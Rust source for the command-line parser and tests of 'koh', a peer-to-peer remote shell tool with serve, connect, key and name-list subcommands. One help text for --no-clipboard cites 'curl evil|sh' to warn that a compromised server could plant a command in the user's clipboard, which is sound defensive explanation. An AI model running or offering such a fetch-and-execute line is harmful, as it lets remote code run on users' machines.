//! The command line: clap's builder API, and the config structs it produces.
//!
//! Built with the builder API rather than the derive, whose expansions `allow` lints this crate
//! forbids. Help texts are single sentences without a final period, as clap prints them.
//!
//! Endpoint ids and relay URLs are parsed here, by clap, so the configs carry parsed values and an
//! invalid one never gets past the command line.

use std::error::Error as _;
use std::net::SocketAddr;
use std::path::PathBuf;

use clap::error::ErrorKind;
use clap::{value_parser, Arg, ArgAction, ArgMatches, Command};
use iroh::{EndpointId, RelayUrl};

use koh::client::ConnectConfig;
use koh::keycmd::{KeyConfig, KeyOp};
use koh::names::{List, Op};
use koh::server::cli::{
    DEFAULT_MAX_CONNECTIONS, DEFAULT_MAX_SESSIONS, DEFAULT_SCROLLBACK, DEFAULT_SESSION_TTL_SECS,
    MAX_SCROLLBACK,
};
use koh::server::ServeConfig;
use koh::transport_iroh::{parse_endpoint_id, parse_relay_url};

/// A value clap could not parse, with the message koh reports for it (see [`bad_value`]).
#[derive(Debug)]
pub struct BadValue(String);

impl std::fmt::Display for BadValue {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for BadValue {}

/// koh's message for `error` if it is a value one of koh's own parsers refused. koh prints it as it
/// prints every error of its own, `koh: <message>`, rather than in clap's form.
pub fn bad_value(error: &clap::Error) -> Option<&BadValue> {
    error.source()?.downcast_ref()
}

/// A `--allow` endpoint id.
fn allow_id(value: &str) -> Result<EndpointId, BadValue> {
    parse_endpoint_id(value).map_err(|e| BadValue(format!("bad --allow id: {value}: {e}")))
}

/// The server `koh connect` dials: an endpoint id, or the name of one saved in `servers`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ServerRef {
    Id(EndpointId),
    Name(String),
}

/// A [`ServerRef`]: an id if it reads as one, else a name if it is one.
fn server_ref(value: &str) -> Result<ServerRef, BadValue> {
    match parse_endpoint_id(value) {
        Ok(id) => Ok(ServerRef::Id(id)),
        Err(_) if koh::names::check_name(value).is_ok() => Ok(ServerRef::Name(value.to_owned())),
        Err(e) => Err(BadValue(format!("parsing server endpoint id: {e}"))),
    }
}

/// A name for `koh servers` or `koh clients`.
fn name(value: &str) -> Result<String, BadValue> {
    koh::names::check_name(value)
        .map(|()| value.to_owned())
        .map_err(|e| BadValue(e.to_string()))
}

/// An endpoint id to save under a name.
fn saved_id(value: &str) -> Result<EndpointId, BadValue> {
    parse_endpoint_id(value).map_err(|e| BadValue(format!("bad endpoint id: {value}: {e}")))
}

/// A `--relay-url`.
fn relay_url(value: &str) -> Result<RelayUrl, BadValue> {
    parse_relay_url(value).map_err(|e| BadValue(e.to_string()))
}

/// What the command line asks for.
#[derive(Debug)]
pub enum Cmd {
    Serve(ServeConfig),
    Connect(ConnectArgs),
    Key(KeyConfig),
    /// `koh servers` or `koh clients`.
    Names {
        list: List,
        op: Op,
        key_file: Option<PathBuf>,
    },
    /// `koh` alone: the menu on a terminal, else help.
    Menu,
}

/// `koh connect`'s arguments: a [`ConnectConfig`] once its server is known.
#[derive(Debug, Clone)]
pub struct ConnectArgs {
    pub server: ServerRef,
    pub key_file: Option<PathBuf>,
    pub direct: Option<SocketAddr>,
    pub relay_url: Option<RelayUrl>,
    pub clipboard: bool,
    pub hyperlinks: bool,
    pub colours: bool,
    pub bell_command: Option<String>,
}

impl ConnectArgs {
    /// The config for dialing `server`.
    pub fn into_config(self, server: EndpointId) -> ConnectConfig {
        ConnectConfig {
            server,
            key_file: self.key_file,
            direct: self.direct,
            relay_url: self.relay_url,
            clipboard: self.clipboard,
            hyperlinks: self.hyperlinks,
            colours: self.colours,
            bell_command: self.bell_command,
        }
    }
}

/// `koh`'s command line.
pub fn command() -> Command {
    Command::new("koh")
        .version(env!("CARGO_PKG_VERSION"))
        .about("koh — a resilient peer-to-peer remote shell (mosh over iroh). Run alone on a terminal, it opens a menu of your keys, servers and clients")
        .subcommand(serve())
        .subcommand(connect())
        .subcommand(id())
        .subcommand(key())
        .subcommand(names(List::Servers))
        .subcommand(names(List::Clients))
}

/// An optional path, `--NAME <VALUE_NAME>`.
fn path(id: &'static str, long: &'static str, value_name: &'static str) -> Arg {
    Arg::new(id)
        .long(long)
        .value_name(value_name)
        .value_parser(value_parser!(PathBuf))
}

/// A flag, `--NAME`.
fn flag(id: &'static str, long: &'static str) -> Arg {
    Arg::new(id).long(long).action(ArgAction::SetTrue)
}

fn serve() -> Command {
    Command::new("serve")
        .about("Host a PTY shell for authorized clients")
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the persistent secret-key file (gives a stable endpoint id across restarts)"),
        )
        .arg(
            Arg::new("allow")
                .long("allow")
                .value_name("ENDPOINT_ID")
                .value_parser(allow_id)
                .action(ArgAction::Append)
                .help("Authorize a client endpoint id (repeatable), for this run, beside the clients saved with `koh clients add`. At least one client is required — koh only serves peers whose node-id is allowed"),
        )
        .arg(
            Arg::new("shell")
                .long("shell")
                .value_name("PROGRAM_OR_ARG")
                .action(ArgAction::Append)
                .help("Program to run in the session (defaults to the user's login shell). Repeat to pass arguments: `--shell zellij --shell attach --shell -c --shell main` runs `zellij attach -c main`. The value is never split on whitespace"),
        )
        .arg(
            Arg::new("scrollback")
                .long("scrollback")
                .value_name("SCROLLBACK")
                .default_value(DEFAULT_SCROLLBACK.to_string())
                .value_parser(value_parser!(u64).range(0..=MAX_SCROLLBACK))
                .help("Scrollback lines retained by the server-side emulator (per session). Bounded like the other resource knobs (`--max-connections`/`--max-sessions`) and by the emulator's per-buffer cell limit at the largest screen. 0 = no scrollback"),
        )
        .arg(
            Arg::new("session_ttl_secs")
                .long("session-ttl-secs")
                .value_name("SESSION_TTL_SECS")
                .default_value(DEFAULT_SESSION_TTL_SECS.to_string())
                .value_parser(value_parser!(u64))
                .help("Keep a detached session's shell alive this long (seconds) for the client to reconnect. Default 24h (mosh-style \"close the laptop, reopen later\")"),
        )
        .arg(
            Arg::new("relay_url")
                .long("relay-url")
                .value_name("URL")
                .value_parser(relay_url)
                .help("Host via a self-hosted relay URL instead of n0's public relays"),
        )
        .arg(
            flag("local", "local")
                .conflicts_with("relay_url")
                .help("Bind without any relay/discovery (LAN / loopback). Clients dial with --direct <ip:port>"),
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .value_parser(value_parser!(u16).range(1..))
                .help("Bind this UDP port (IPv4 and IPv6) instead of an ephemeral one, so clients dialing --direct <ip:port> find the server again after a restart"),
        )
        .arg(
            Arg::new("max_connections")
                .long("max-connections")
                .value_name("MAX_CONNECTIONS")
                .default_value(DEFAULT_MAX_CONNECTIONS.to_string())
                .value_parser(value_parser!(u32).range(1..))
                .help("Maximum number of connections being handled concurrently (each holds a permit for its whole lifetime; excess incoming connections are refused cheaply, before the crypto handshake). This bounds the work a flood of dials can pin on the server before the allowlist check rejects them"),
        )
        .arg(
            Arg::new("max_sessions")
                .long("max-sessions")
                .value_name("MAX_SESSIONS")
                .default_value(DEFAULT_MAX_SESSIONS.to_string())
                .value_parser(value_parser!(u32).range(1..))
                .help("Maximum number of distinct live sessions (one per authorized peer). A new peer is refused once this many sessions exist; reconnecting to an existing session is always allowed. Bounds the number of real shells a flood of authorized keys can spawn"),
        )
}

fn connect() -> Command {
    Command::new("connect")
        .about("Connect to a koh server by its name or endpoint id")
        .arg(
            Arg::new("server")
                .value_name("SERVER")
                .value_parser(server_ref)
                .required(true)
                .help("The server: a name saved with `koh servers add`, or its endpoint id"),
        )
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the client's persistent secret key (its endpoint id must be on the server's allowlist)"),
        )
        .arg(
            Arg::new("direct")
                .long("direct")
                .value_name("IP:PORT")
                .value_parser(value_parser!(SocketAddr))
                .conflicts_with("relay_url")
                .help("Dial the server at a direct socket address (LAN / loopback; no relay or discovery)"),
        )
        .arg(
            Arg::new("relay_url")
                .long("relay-url")
                .value_name("URL")
                .value_parser(relay_url)
                .help("Dial the server via a self-hosted relay URL instead of n0's public relays"),
        )
        .arg(
            flag("no_clipboard", "no-clipboard")
                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 16 KiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
        )
        .arg(
            flag("no_hyperlinks", "no-hyperlinks")
                .help("Paint the remote app's hyperlinks (OSC 8) as plain text. By default they are painted as links your terminal can open, each checked first: printable ASCII only, within fux-vt's limits"),
        )
        .arg(
            flag("no_colours", "no-colours")
                .help("Do not tell the server your terminal's colours. By default koh asks your terminal its foreground, background, palette entries 0 to 15 and dark or light scheme, and the server answers remote programs that ask (vim, bat, delta pick their theme so); that tells the server your theme, a small fingerprint"),
        )
        .arg(
            Arg::new("on_bell")
                .long("on-bell")
                .value_name("CMD")
                .help("Run this shell command whenever the remote bell rings (e.g. on Termux: `--on-bell 'termux-notification -t \"koh bell\"'`). Detached from the terminal; at most one spawn per second. KOH_BELL_COUNT and KOH_TITLE are set in its environment. Bells that rang before you attached do not fire it; bells during a reconnect do"),
        )
}

fn id() -> Command {
    Command::new("id")
        .about("Print this machine's koh id (add it to a server's --allow list)")
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the client's persistent secret key"),
        )
}

fn key() -> Command {
    Command::new("key")
        .about("Show or reset this machine's identity key")
        .subcommand_required(true)
        .arg_required_else_help(true)
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .global(true)
                // After the subcommand's own options, where the derive listed it.
                .display_order(1)
                .help("Which identity key to operate on. Defaults to the client key path (as `koh id` uses); pass a server key explicitly to manage it"),
        )
        .subcommand(
            Command::new("info")
                .about("Print the key files and their endpoint ids (never the secret): both keys, or the one named")
                .arg(role()),
        )
        .subcommand(
            Command::new("reset")
                .about("Delete an unused identity; the next use creates a new endpoint ID")
                .arg(role())
                .arg(flag("yes", "yes").help("Acknowledge permanent identity loss and required allowlist updates")),
        )
}

/// Which key, `client` (the default) or `server`.
fn role() -> Arg {
    Arg::new("role")
        .value_name("KEY")
        .value_parser(["client", "server"])
        .conflicts_with("key_file")
        .help("Which key: client (as `koh id` and `koh connect` use; the default) or server (as `koh serve` uses)")
}

/// `koh servers` or `koh clients`.
fn names(list: List) -> Command {
    let (about, key) = match list {
        List::Servers => (
            "List, add, remove or rename the servers this machine connects to, by name",
            "client",
        ),
        List::Clients => (
            "List, add, remove or rename the clients allowed to connect to this machine",
            "server",
        ),
    };
    Command::new(list.file())
        .about(about)
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .global(true)
                .display_order(1)
                .help(format!(
                    "The {key} key whose directory holds the list (defaults to the {key} key path)"
                )),
        )
        .subcommand(
            Command::new("add")
                .about(format!("Save a {} under a name", list.noun()))
                .arg(
                    Arg::new("name")
                        .value_name("NAME")
                        .value_parser(name)
                        .required(true),
                )
                .arg(
                    Arg::new("id")
                        .value_name("ENDPOINT_ID")
                        .value_parser(saved_id)
                        .required(true),
                ),
        )
        .subcommand(
            Command::new("rm")
                .about(format!("Forget a {}", list.noun()))
                .arg(
                    Arg::new("name")
                        .value_name("NAME")
                        .value_parser(name)
                        .required(true),
                ),
        )
        .subcommand(
            Command::new("rename")
                .about(format!("Rename a {}", list.noun()))
                .arg(
                    Arg::new("old")
                        .value_name("OLD")
                        .value_parser(name)
                        .required(true),
                )
                .arg(
                    Arg::new("new")
                        .value_name("NEW")
                        .value_parser(name)
                        .required(true),
                ),
        )
}

/// The config `matches` asks for. clap has already enforced the required subcommands and
/// arguments, the defaults and the ranges, so a missing value is an internal error.
pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
    match matches.subcommand() {
        Some(("serve", m)) => Ok(Cmd::Serve(ServeConfig {
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            allow: m
                .get_many::<EndpointId>("allow")
                .map_or_else(Vec::new, |ids| ids.copied().collect()),
            command: strings(m, "shell"),
            scrollback: value(m, "scrollback")?,
            session_ttl_secs: value(m, "session_ttl_secs")?,
            relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
            local: m.get_flag("local"),
            port: m.get_one::<u16>("port").copied(),
            max_connections: value(m, "max_connections")?,
            max_sessions: value(m, "max_sessions")?,
            launcher: koh::pty::Launcher::this_binary(),
        })),
        Some(("connect", m)) => Ok(Cmd::Connect(ConnectArgs {
            server: m
                .get_one::<ServerRef>("server")
                .cloned()
                .ok_or_else(|| missing("server"))?,
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            direct: m.get_one::<SocketAddr>("direct").copied(),
            relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
            clipboard: !m.get_flag("no_clipboard"),
            hyperlinks: !m.get_flag("no_hyperlinks"),
            colours: !m.get_flag("no_colours"),
            bell_command: m.get_one::<String>("on_bell").cloned(),
        })),
        Some(("id", m)) => Ok(Cmd::Key(KeyConfig {
            op: KeyOp::Id,
            role: "client",
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            role_named: false,
        })),
        Some(("key", m)) => {
            let (op, sub) = match m.subcommand() {
                Some(("info", sub)) => (KeyOp::Info, sub),
                Some(("reset", sub)) => (
                    KeyOp::Reset {
                        confirmed: sub.get_flag("yes"),
                    },
                    sub,
                ),
                _ => return Err(missing("key subcommand")),
            };
            // `--key-file` is global to `key`: clap stores it with the subcommand given.
            let key_file = sub
                .get_one::<PathBuf>("key_file")
                .or_else(|| m.get_one::<PathBuf>("key_file"))
                .cloned();
            let named = sub.get_one::<String>("role");
            let role = if named.is_some_and(|r| r == "server") {
                "server"
            } else {
                "client"
            };
            Ok(Cmd::Key(KeyConfig {
                op,
                role,
                key_file,
                role_named: named.is_some(),
            }))
        }
        Some((list @ ("servers" | "clients"), m)) => {
            let list = if list == "servers" {
                List::Servers
            } else {
                List::Clients
            };
            let one = |sub: &ArgMatches, id: &str| {
                sub.get_one::<String>(id)
                    .cloned()
                    .ok_or_else(|| missing(id))
            };
            let (op, sub) = match m.subcommand() {
                None => (Op::List, m),
                Some(("add", sub)) => (
                    Op::Add {
                        name: one(sub, "name")?,
                        id: sub
                            .get_one::<EndpointId>("id")
                            .copied()
                            .ok_or_else(|| missing("id"))?,
                    },
                    sub,
                ),
                Some(("rm", sub)) => (
                    Op::Remove {
                        name: one(sub, "name")?,
                    },
                    sub,
                ),
                Some(("rename", sub)) => (
                    Op::Rename {
                        old: one(sub, "old")?,
                        new: one(sub, "new")?,
                    },
                    sub,
                ),
                Some(_) => return Err(missing("servers or clients subcommand")),
            };
            let key_file = sub
                .get_one::<PathBuf>("key_file")
                .or_else(|| m.get_one::<PathBuf>("key_file"))
                .cloned();
            Ok(Cmd::Names { list, op, key_file })
        }
        None => Ok(Cmd::Menu),
        Some(_) => Err(missing("subcommand")),
    }
}

/// Every value of a repeatable argument, in order.
fn strings(m: &ArgMatches, id: &str) -> Vec<String> {
    m.get_many::<String>(id)
        .map_or_else(Vec::new, |values| values.cloned().collect())
}

/// An argument that has a default, so always a value.
fn value<T: Clone + Send + Sync + 'static>(m: &ArgMatches, id: &str) -> Result<T, clap::Error> {
    m.get_one::<T>(id).cloned().ok_or_else(|| missing(id))
}

fn missing(what: &str) -> clap::Error {
    clap::Error::raw(
        ErrorKind::MissingRequiredArgument,
        format!("internal error: no {what} after parsing\n"),
    )
}

#[cfg(test)]
mod tests {
    use super::{bad_value, command, parse, Cmd};
    use clap::error::ErrorKind;
    use koh::keycmd::KeyOp;
    use koh::server::ServeConfig;

    /// A valid endpoint id.
    const ID: &str = "d12841817cf7b0e8b357ae293f8a0c7d911d9661b06833a8365a1b3e7f83febf";

    fn parsed(argv: &[&str]) -> Cmd {
        let matches = command()
            .try_get_matches_from(argv)
            .expect("valid command line");
        parse(&matches).expect("parsed")
    }

    #[test]
    fn the_command_line_is_consistent() {
        command().debug_assert();
    }

    #[test]
    fn serve_args_map_shell_to_command_argv_and_keep_defaults() {
        let Cmd::Serve(c) = parsed(&[
            "koh", "serve", "--allow", ID, "--shell", "zellij", "--shell", "attach",
        ]) else {
            panic!("serve");
        };
        assert_eq!(c.command, ["zellij", "attach"]);
        assert_eq!(c.allow, [ID.parse().unwrap()]);
        // Everything not given on the command line must equal `ServeConfig::default()`.
        let d = ServeConfig::default();
        assert_eq!(c.scrollback, d.scrollback);
        assert_eq!(c.session_ttl_secs, d.session_ttl_secs);
        assert_eq!(c.max_connections, d.max_connections);
        assert_eq!(c.max_sessions, d.max_sessions);
        assert!(!c.local && c.relay_url.is_none() && c.key_file.is_none());
        assert_eq!(c.port, d.port);

        // A single `--shell` is just the program.
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--shell", "/bin/zsh"]) else {
            panic!("serve");
        };
        assert_eq!(c.command, ["/bin/zsh"]);
        // No `--shell` = login shell.
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID]) else {
            panic!("serve");
        };
        assert_eq!(c.command, Vec::<String>::new());
    }

    #[test]
    fn serve_port_is_a_nonzero_udp_port() {
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--local", "--port", "4433"])
        else {
            panic!("serve");
        };
        assert_eq!(c.port, Some(4433));
        assert!(c.local);
        for port in ["0", "65536", "http"] {
            let error = command()
                .try_get_matches_from(["koh", "serve", "--allow", ID, "--port", port])
                .expect_err("an invalid port");
            assert_eq!(error.kind(), ErrorKind::ValueValidation, "{port}");
        }
    }

    #[test]
    fn connect_args_map_on_bell_to_bell_command() {
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--on-bell", "termux-notification"])
        else {
            panic!("connect");
        };
        assert_eq!(c.server, super::ServerRef::Id(ID.parse().unwrap()));
        assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
        assert!(
            c.clipboard && c.direct.is_none(),
            "clipboard writes on by default"
        );
        assert!(koh::client::ConnectConfig::new(ID.parse().unwrap()).clipboard);
    }

    #[test]
    fn no_clipboard_turns_clipboard_writes_off() {
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-clipboard"]) else {
            panic!("connect");
        };
        assert!(!c.clipboard);
        // The old opt-in is gone, so a script that passed it hears of it.
        assert!(command()
            .try_get_matches_from(["koh", "connect", ID, "--clipboard"])
            .is_err());
    }

    #[test]
    fn hyperlinks_are_on_by_default_and_off_with_no_hyperlinks() {
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID]) else {
            panic!("connect");
        };
        assert!(c.hyperlinks);
        assert!(koh::client::ConnectConfig::new(ID.parse().unwrap()).hyperlinks);
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-hyperlinks"]) else {
            panic!("connect");
        };
        assert!(!c.hyperlinks && c.clipboard);
    }

    #[test]
    fn colours_are_told_by_default_and_not_with_no_colours() {
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID]) else {
            panic!("connect");
        };
        assert!(c.colours);
        assert!(koh::client::ConnectConfig::new(ID.parse().unwrap()).colours);
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-colours"]) else {
            panic!("connect");
        };
        assert!(!c.colours && c.hyperlinks);
    }

    #[test]
    fn ids_and_relay_urls_are_parsed_on_the_command_line() {
        let Cmd::Serve(c) = parsed(&[
            "koh",
            "serve",
            "--allow",
            ID,
            "--relay-url",
            "https://relay.example",
        ]) else {
            panic!("serve");
        };
        assert_eq!(c.relay_url, Some("https://relay.example".parse().unwrap()));
        // An invalid value is refused while parsing the command line, with the message koh gave
        // when it parsed the value later.
        let invalid = "could not parse endpoint id: invalid length";
        for (argv, message) in [
            (
                &["koh", "serve", "--allow", "bad"][..],
                format!("bad --allow id: bad: {invalid}"),
            ),
            (
                &["koh", "serve", "--allow", ID, "--allow", "bad2"][..],
                format!("bad --allow id: bad2: {invalid}"),
            ),
            (
                &["koh", "connect", "not/a-name"][..],
                format!("parsing server endpoint id: {invalid}"),
            ),
            (
                &["koh", "serve", "--allow", ID, "--relay-url", "bad"][..],
                "bad relay url: Failed to parse relay URL".to_owned(),
            ),
            (
                &["koh", "connect", ID, "--relay-url", "bad"][..],
                "bad relay url: Failed to parse relay URL".to_owned(),
            ),
        ] {
            let error = command()
                .try_get_matches_from(argv)
                .expect_err("an invalid value");
            assert_eq!(error.kind(), ErrorKind::ValueValidation, "{argv:?}");
            assert_eq!(
                bad_value(&error).map(ToString::to_string),
                Some(message),
                "{argv:?}"
            );
        }
    }

    #[test]
    fn connect_takes_a_saved_name_or_an_id() {
        let Cmd::Connect(c) = parsed(&["koh", "connect", "laptop"]) else {
            panic!("connect");
        };
        assert_eq!(c.server, super::ServerRef::Name("laptop".to_owned()));
        let Cmd::Connect(c) = parsed(&["koh", "connect", ID]) else {
            panic!("connect");
        };
        assert_eq!(c.server, super::ServerRef::Id(ID.parse().unwrap()));
    }

    #[test]
    fn servers_and_clients_take_add_rm_and_rename() {
        use koh::names::{List, Op};
        let Cmd::Names { list, op, key_file } = parsed(&["koh", "servers"]) else {
            panic!("servers");
        };
        assert_eq!((list, op, key_file), (List::Servers, Op::List, None));
        let Cmd::Names { list, op, key_file } =
            parsed(&["koh", "clients", "add", "phone", ID, "--key-file", "/k"])
        else {
            panic!("clients add");
        };
        assert_eq!(list, List::Clients);
        assert_eq!(
            op,
            Op::Add {
                name: "phone".to_owned(),
                id: ID.parse().unwrap()
            }
        );
        assert_eq!(key_file.as_deref(), Some(std::path::Path::new("/k")));
        let Cmd::Names { op, .. } = parsed(&["koh", "servers", "rename", "a", "b"]) else {
            panic!("servers rename");
        };
        assert_eq!(
            op,
            Op::Rename {
                old: "a".to_owned(),
                new: "b".to_owned()
            }
        );
        assert!(command()
            .try_get_matches_from(["koh", "servers", "add", "-x", ID])
            .is_err());
    }

    #[test]
    fn key_reset_names_the_key_and_defaults_to_the_client_one() {
        let Cmd::Key(c) = parsed(&["koh", "key", "reset", "server", "--yes"]) else {
            panic!("key reset");
        };
        assert_eq!((c.role, c.role_named), ("server", true));
        let Cmd::Key(c) = parsed(&["koh", "key", "reset", "--yes"]) else {
            panic!("key reset");
        };
        assert_eq!((c.role, c.role_named), ("client", false));
        assert!(
            command()
                .try_get_matches_from(["koh", "key", "reset", "server", "--key-file", "/k"])
                .is_err(),
            "a named key and a key file at once"
        );
    }

    #[test]
    fn koh_alone_is_the_menu() {
        assert!(matches!(parsed(&["koh"]), Cmd::Menu));
    }

    #[test]
    fn the_key_file_is_global_to_key() {
        for argv in [
            ["koh", "key", "--key-file", "/k", "reset", "--yes"],
            ["koh", "key", "reset", "--key-file", "/k", "--yes"],
        ] {
            let Cmd::Key(c) = parsed(&argv) else {
                panic!("key");
            };
            assert!(matches!(c.op, KeyOp::Reset { confirmed: true }), "{argv:?}");
            assert_eq!(
                c.key_file.as_deref(),
                Some(std::path::Path::new("/k")),
                "{argv:?}"
            );
        }
        let Cmd::Key(c) = parsed(&["koh", "key", "info"]) else {
            panic!("key");
        };
        assert!(matches!(c.op, KeyOp::Info) && c.key_file.is_none());
    }
}
